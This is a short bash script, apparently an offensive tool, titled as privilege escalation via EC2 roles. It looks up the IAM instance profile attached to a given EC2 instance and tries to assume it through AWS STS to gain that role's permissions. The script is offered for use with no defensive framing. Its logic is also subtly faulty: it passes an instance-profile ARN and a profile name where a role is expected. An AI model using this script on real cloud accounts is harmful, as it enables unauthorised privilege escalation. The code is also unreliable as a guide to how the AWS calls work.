#!/bin/bash
# Privilege escalation via EC2 roles
# Usage: ec2_role_priv_esc.sh <instance_id>

INSTANCE_ID=$1

if [ -z "$INSTANCE_ID" ]; then
    echo "Usage: $0 <instance_id>"
    exit 1
fi

echo "Escalating privileges using role attached to instance: $INSTANCE_ID"
aws ec2 describe-instances --instance-ids $INSTANCE_ID --query 'Reservations[*].Instances[*].[IamInstanceProfile.Arn]' --output text | while read role_arn; do
    role_name=$(echo $role_arn | awk -F/ '{print $2}')
    echo "Assuming role: $role_name"
    aws sts assume-role --role-arn $role_arn --role-session-name escalation-session
done
